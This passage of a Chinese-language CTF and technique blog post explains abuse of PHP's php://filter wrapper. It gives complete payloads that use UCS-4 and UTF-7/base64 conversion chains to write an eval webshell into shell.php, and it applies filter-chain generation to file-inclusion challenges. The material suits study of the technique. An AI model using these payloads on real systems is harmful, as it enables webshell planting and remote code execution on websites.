<p><img src="/2024/05/27/%E5%AF%B9php%E7%9A%84filter%E8%BF%87%E6%BB%A4%E5%99%A8%E5%88%A9%E7%94%A8%E7%9A%84%E6%80%BB%E7%BB%93/image-20240522201457636.png" alt="image-20240522201457636"></p>
<p>成功利用：<br><img src="/2024/05/27/%E5%AF%B9php%E7%9A%84filter%E8%BF%87%E6%BB%A4%E5%99%A8%E5%88%A9%E7%94%A8%E7%9A%84%E6%80%BB%E7%BB%93/image-20240522201556443.png" alt="image-20240522201556443"></p>
<ul>
<li><strong>usc-4</strong></li>
</ul>
<p>这个和上面那个差不多的，只不过这个是对目标字符串进行4位以反转(这里的4LE和4BE可以看作是小端和大端的列子），也就是说目标字符串的字节需要为4的倍数，简单说说：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">iconv</span>(<span class="string">&quot;UCS-4LE&quot;</span>,<span class="string">&quot;UCS-4BE&quot;</span>,<span class="string">&#x27;&lt;?php @eval($_POST[x12]); ?&gt;&#x27;</span>);</span><br><span class="line"><span class="comment">#hp?&lt;e@ p(lavOP_$x[TS)]21&gt;? ;</span></span><br></pre></td></tr></table></figure>

<p>payload:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">php://filter/write=convert.iconv.UCS-4LE.UCS-4BE|hp?&lt;e@ p(lavOP_$x[TS)]21&gt;? ;/resource=shell.php</span><br></pre></td></tr></table></figure>

<p>最终效果：</p>
<p>写入：</p>
<p><img src="/2024/05/27/%E5%AF%B9php%E7%9A%84filter%E8%BF%87%E6%BB%A4%E5%99%A8%E5%88%A9%E7%94%A8%E7%9A%84%E6%80%BB%E7%BB%93/image-20240522202744151.png" alt="image-20240522202744151"></p>
<p>利用：</p>
<p><img src="/2024/05/27/%E5%AF%B9php%E7%9A%84filter%E8%BF%87%E6%BB%A4%E5%99%A8%E5%88%A9%E7%94%A8%E7%9A%84%E6%80%BB%E7%BB%93/image-20240522202830720.png" alt="image-20240522202830720"></p>
<ul>
<li>utf8-utf7</li>
</ul>
<p>这个方法就与上面两个不同了，由于utf-8与utf-7在编码转换时只对符号进行编码，不对字符编码。如下：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">iconv</span>(<span class="string">&quot;utf-8&quot;</span>,<span class="string">&quot;utf-7&quot;</span>,<span class="string">&#x27;&lt;?php @eval($_POST[x12]); ?&gt;&#x27;</span>);</span><br><span class="line"><span class="comment">#+ADw?php +AEA-eval(+ACQAXw-POST+AFs-x12+AF0)+ADs ?+AD4-   可以看出字符都被留下来了，并且在像上面方法那样利用转换并不能成功，可以自己试试</span></span><br></pre></td></tr></table></figure>

<p>但是注意这个：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">iconv</span>(<span class="string">&quot;utf-8&quot;</span>,<span class="string">&quot;utf-7&quot;</span>,<span class="string">&#x27;=&#x27;</span>);</span><br><span class="line"><span class="comment">#+AD0- 并且刚好是四个字节，可以被base64解码掉</span></span><br></pre></td></tr></table></figure>

<p>这个编码把<code>=</code>给过滤了，这时候就可以想到结合上面将的Base64编码使用，</p>
<p>这是就要注意到之间说过的4个为一个单位来将前面的<code>phpexit</code>去掉，但是这里不一样，需要将传入的字符前面所有都为四个字节为一组，先看简单构造出来的payload:</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">php:<span class="comment">//filter/write=XXXPD9waHAgQGV2YWwoJF9QT1NUWyd4J10pOz8+|convert.iconv.utf-8.utf-7|convert.base64-decode/resource=shell.php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#PD9waHAgQGV2YWwoJF9QT1NUWyd4J10pOz8+  ： &lt;?php @eval($_POST[&#x27;x&#x27;]);?&gt;</span></span><br></pre></td></tr></table></figure>

<p>此时我们就需要想如何使得前面的能够为4个一组，操作点就在<code>XXX</code>那里，写一个php代码看看前面的在过滤后还剩什么：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$c</span>=<span class="string">&#x27;&lt;?php exit;php://filter/write=&#x27;</span>;</span><br><span class="line"><span class="variable">$b</span>=<span class="title function_ invoke__">iconv</span>(<span class="string">&quot;utf-8&quot;</span>,<span class="string">&quot;utf-7&quot;</span>,<span class="variable">$c</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$b</span>.PHP_EOL;</span><br><span class="line"><span class="variable">$ga</span>= <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;|[^a-z0-9A-Z+/]|s&#x27;</span>, <span class="string">&#x27;&#x27;</span>, <span class="variable">$b</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$ga</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">输出：</span><br><span class="line">+ADw?php <span class="keyword">exit</span>+ADs-php:<span class="comment">//filter/write+AD0-</span></span><br><span class="line"></span><br><span class="line">+ADwphpexit+ADsphp<span class="comment">//filter/write+AD0</span></span><br><span class="line"></span><br><span class="line">    </span><br><span class="line"><span class="comment">#第二个字符串就是我们最终会被base64解码的字符串，这里刚好有36个字节，所以不用往前面加东西-即不用加X</span></span><br></pre></td></tr></table></figure>

<p>最终payload:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">php://filter/write=PD9waHAgQGV2YWwoJF9QT1NUWyd4J10pOz8+|convert.iconv.utf-8.utf-7|convert.base64-decode/resource=shell.php</span><br></pre></td></tr></table></figure>

<p>成功写入：<br><img src="/2024/05/27/%E5%AF%B9php%E7%9A%84filter%E8%BF%87%E6%BB%A4%E5%99%A8%E5%88%A9%E7%94%A8%E7%9A%84%E6%80%BB%E7%BB%93/image-20240522212950464.png" alt="image-20240522212950464"></p>
<p>利用：<br><img src="/2024/05/27/%E5%AF%B9php%E7%9A%84filter%E8%BF%87%E6%BB%A4%E5%99%A8%E5%88%A9%E7%94%A8%E7%9A%84%E6%80%BB%E7%BB%93/image-20240522213035987.png" alt="image-20240522213035987"></p>
<p>参考文章：</p>
<p><code>https://www.leavesongs.com/PENETRATION/php-filter-magic.html</code></p>
<p><code>https://xz.aliyun.com/t/8163?time__1311=n4%2BxuDgDBDyGKAKD%3DD7Dl1oQST4j2DiKErYx&amp;alichlgref=https%3A%2F%2Fwww.google.com%2F#toc-6</code></p>
<p><code>https://blog.csdn.net/woshilnp/article/details/117266628</code></p>
<h3 id="利用filter-chain生成任意字符"><a href="#利用filter-chain生成任意字符" class="headerlink" title="利用filter chain生成任意字符"></a>利用filter chain生成任意字符</h3><p>所以这里就利用了filter链的构造，详细看这个项目：</p>
<p><a href="https://gist.github.com/loknop/b27422d355ea1fd0d90d6dbc1e278d4d">https://gist.github.com/loknop/b27422d355ea1fd0d90d6dbc1e278d4d</a></p>
<p>当然也有可以直接用来梭的脚本：</p>
<p><a href="https://github.com/synacktiv/php_filter_chain_generator">https://github.com/synacktiv/php_filter_chain_generator</a></p>
<h5 id="php-temp"><a href="#php-temp" class="headerlink" title="php:&#x2F;&#x2F;temp"></a>php:&#x2F;&#x2F;temp</h5><p>这里说明一个知识点，temp和memory伪协议</p>
<p><code>php://memory</code>和<code>php://temp</code>是一个类似文件包装器的数据流，允许读写临时数据。两者的唯一区别是<code>php://memory</code>总是把数据储存在内存中，而<code>php://temp</code>的内存限制可通过田间<code>/maxmemory:NN</code>来控制，NN是以字节为单位、保留在内存的最大数据量，超过则使用临时文件</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$fiveMBs</span> = <span class="number">5</span> * <span class="number">1024</span> * <span class="number">1024</span>;  </span><br><span class="line"><span class="variable">$fp</span> = <span class="title function_ invoke__">fopen</span>(<span class="string">&quot;php://temp/maxmemory:<span class="subst">$fiveMBs</span>&quot;</span>, <span class="string">&#x27;r+&#x27;</span>);  </span><br><span class="line"><span class="title function_ invoke__">fputs</span>(<span class="variable">$fp</span>, <span class="string">&quot;hello\n&quot;</span>);  </span><br><span class="line"><span class="comment">// 读取写入的数据.  </span></span><br><span class="line"><span class="title function_ invoke__">rewind</span>(<span class="variable">$fp</span>);  </span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">stream_get_contents</span>(<span class="variable">$fp</span>);</span><br></pre></td></tr></table></figure>

<p><code>php://memory</code>和<code>php://temp</code>是一次性的，比如：当stream流关闭后，就无法再次得到以前的内容了</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">file_put_contents</span>(<span class="string">&#x27;php://memory&#x27;</span>, <span class="string">&#x27;PHP&#x27;</span>);  </span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">file_get_contents</span>(<span class="string">&#x27;php://memory&#x27;</span>); <span class="comment">// 啥也没有</span></span><br></pre></td></tr></table></figure>

<h5 id="如何构造"><a href="#如何构造" class="headerlink" title="如何构造"></a>如何构造</h5><p>由于PHP Filter的存在，我们可以利用一些操作来构造自己想要的内容。正好PHP Filter当中有一种<code>convert.iconv</code>的Filter，可以用来将数据从字符集A转换为字符集B。</p>
<p>举个简单的例子：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$content</span> = <span class="string">&quot;php://filter/convert.iconv.UTF-8/UTF-7/resource=data://,some&lt;&gt;text&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$content</span>);</span><br><span class="line"><span class="comment">// some+ADwAPg-text 同时这里的data:,其实就是data伪协议，只是这里没有指定媒体类型，默认为text/plain;charset=US-ASCII，故只有后面的some&lt;&gt;text被转换了。</span></span><br></pre></td></tr></table></figure>

<p>那么如何利用呢？</p>
<p><strong>这里先说明一个技巧：</strong>当我们使用其他字符编码产生了不可见字符，并且对于PHP Base来说是非法字符（比如：$)C），那么此时我们只需要base64-decoded一下就可以去掉不可见字符了，但是与此同时，我们的C字符也也被 base64-decode解码了，这时候需要再把解码结果使用一次base64-encode即可还原回来原来的C字符，这样就可以留下我们想要的字符了。</p>
<p>比如我们现在想要构造尖括号，因为base64编码合法字符里没有尖括号，所以不能直接产生PHP代码进行包含，但是可以通过上面的那个技巧来产生一个Base64字符串，最后再使用一次base64解码就可以产生了</p>
<p>比如我们可以通过生成<code>PAaaaaa</code>，最后再经过Base64解码得到的字符为<code>&lt;</code>，后续为其他不需要的垃圾字符串。所以接下来需要做的，就是利用上面的技巧找到这么一类编码，可以只存在我们需要构造的一个webshell的base64字符串了。</p>
<p>大概就是这个意思，直接看题，具体构造直接看下面的参考文章。</p>
<h5 id="如何利用"><a href="#如何利用" class="headerlink" title="如何利用"></a>如何利用</h5><p>下面都是直接利用的这个项目：<code>https://github.com/synacktiv/php_filter_chain_generator</code></p>
<h6 id="用于文件包含"><a href="#用于文件包含" class="headerlink" title="用于文件包含"></a>用于文件包含</h6><p><strong>通过叠加过滤器能够在allow_url_fopen和allow_url_include双Off的情况下直接通过php:&#x2F;&#x2F;filter进行文件包含getshell</strong>，比如XYCTF的题</p>
<p><strong>ezLFI</strong></p>
<p>题目描述：一句话木马？<br>——————</p>
<p>有附件，可以知道index.php的内容为<code>&lt;?php include_once($_REQUEST[&#39;file&#39;]);</code>，waf了很多，这里可以通过叠加过滤器能够在allow_url_fopen和allow_url_include双Off的情况下直接通过php:&#x2F;&#x2F;filter进行文件包含getshell</p>
<p>项目地址：<code>https://github.com/synacktiv/php_filter_chain_generator</code>，直接利用这个脚本生成</p>
<p>如下：</p>
<p><img src="/2024/05/27/%E5%AF%B9php%E7%9A%84filter%E8%BF%87%E6%BB%A4%E5%99%A8%E5%88%A9%E7%94%A8%E7%9A%84%E6%80%BB%E7%BB%93/image-20240527152334913.png" alt="image-20240527152334913"></p>
<p>成功得到flag</p>
<p><img src="/2024/05/27/%E5%AF%B9php%E7%9A%84filter%E8%BF%87%E6%BB%A4%E5%99%A8%E5%88%A9%E7%94%A8%E7%9A%84%E6%80%BB%E7%BB%93/image-20240527152405691.png" alt="image-20240527152405691"></p>
<p><strong>这里可以利用的原因</strong>就在于<code>php://temp</code>，经过一系列过滤器处理后的数据被传递给了<code>php://temp</code>流，这意味着最终的数据被写入了一个临时文件中。这个临时文件中包含了经过处理的数据，由此可以用于文件包含。</p>
<h6 id="用于构造任意字符串"><a href="#用于构造任意字符串" class="headerlink" title="用于构造任意字符串"></a>用于构造任意字符串</h6><p>其实本质和上面那个差不多，这里记录一下做法而已，对于为什么会在前面构造出想要的字符串，看参考文章。</p>
<p><strong>连连看到底是连连什么看</strong></p>
<p>题目描述：到底连连什么看才对呢？（flag在根目录&#x2F;flag下）</p>
<p>——————</p>
<p>开题就是一个小游戏，查看源码看到如下：<br><img src="/2024/05/27/%E5%AF%B9php%E7%9A%84filter%E8%BF%87%E6%BB%A4%E5%99%A8%E5%88%A9%E7%94%A8%E7%9A%84%E6%80%BB%E7%BB%93/image-20240527154205080.png" alt="image-20240527154205080"></p>
<p>直接尝试文件包含<code>?file=/flag</code>,显示：</p>
<p><img src="/2024/05/27/%E5%AF%B9php%E7%9A%84filter%E8%BF%87%E6%BB%A4%E5%99%A8%E5%88%A9%E7%94%A8%E7%9A%84%E6%80%BB%E7%BB%93/image-20240527154253580.png" alt="image-20240527154253580"></p>
<p>直接跳转到这个文件，得到php代码，如下：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$p</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;p&#x27;</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/http|=|php|file|:|\/|\?/i&quot;</span>, <span class="variable">$p</span>))</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;waf!&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$payload</span>=<span class="string">&quot;php://filter/<span class="subst">$p</span>/resource=/etc/passwd&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$payload</span>)===<span class="string">&quot;XYCTF&quot;</span>)&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="title function_ invoke__">file_get_contents</span>(<span class="string">&#x27;/flag&#x27;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>此时就需要借鉴这个项目：<code>https://github.com/synacktiv/php_filter_chain_generator</code></p>
<p>这里我们并不能保证<code>/etc/passwd</code>内容为想要的<code>XYCTF</code>，而且一般都不是，考点不会这么简单，这里估计想考的就是利用filter chain构造任意字符串，如下：<br><img src="/2024/05/27/%E5%AF%B9php%E7%9A%84filter%E8%BF%87%E6%BB%A4%E5%99%A8%E5%88%A9%E7%94%A8%E7%9A%84%E6%80%BB%E7%BB%93/image-20240527154613313.png" alt="image-20240527154613313"></p>
<p>我们本地看看结果是什么</p>
<p><img src="/2024/05/27/%E5%AF%B9php%E7%9A%84filter%E8%BF%87%E6%BB%A4%E5%99%A8%E5%88%A9%E7%94%A8%E7%9A%84%E6%80%BB%E7%BB%93/image-20240527174205087.png" alt="image-20240527174205087"></p>
<p>可以看到确实成功构造出来了<code>XYCTF</code>，但是由于这里有垃圾数据，就需要用到上面说过的<code>string.strip_tags</code>来过滤掉垃圾数据，如下构造</p>
<p><img src="/2024/05/27/%E5%AF%B9php%E7%9A%84filter%E8%BF%87%E6%BB%A4%E5%99%A8%E5%88%A9%E7%94%A8%E7%9A%84%E6%80%BB%E7%BB%93/image-20240527174836426.png" alt="image-20240527174836426"></p>
<p>最终效果</p>
<p><img src="/2024/05/27/%E5%AF%B9php%E7%9A%84filter%E8%BF%87%E6%BB%A4%E5%99%A8%E5%88%A9%E7%94%A8%E7%9A%84%E6%80%BB%E7%BB%93/image-20240527174418038.png" alt="image-20240527174418038"></p>
<p>再传入题目中：</p>
<p><img src="/2024/05/27/%E5%AF%B9php%E7%9A%84filter%E8%BF%87%E6%BB%A4%E5%99%A8%E5%88%A9%E7%94%A8%E7%9A%84%E6%80%BB%E7%BB%93/image-20240527174628296.png" alt="image-20240527174628296"></p>
<p>得到flag</p>
<p>参考文章：</p>
<p><code>https://tttang.com/archive/1395/</code></p>
<p><code>https://probiusofficial.github.io/2023/02/07/Filter/#php-x2F-x2F-filter</code></p>
<p><code>https://boogipop.com/2023/03/02/FilterChain%E6%94%BB%E5%87%BB%E8%A7%A3%E6%9E%90%E5%8F%8A%E5%88%A9%E7%94%A8/#%E4%BB%BB%E6%84%8F%E5%AD%97%E7%AC%A6%E6%9E%84%E9%80%A0</code></p>
]]></content>
      <categories>
        <category>php相关漏洞</category>
        <category>对php的filter过滤器利用总结</category>
      </categories>
  </entry>
</search>
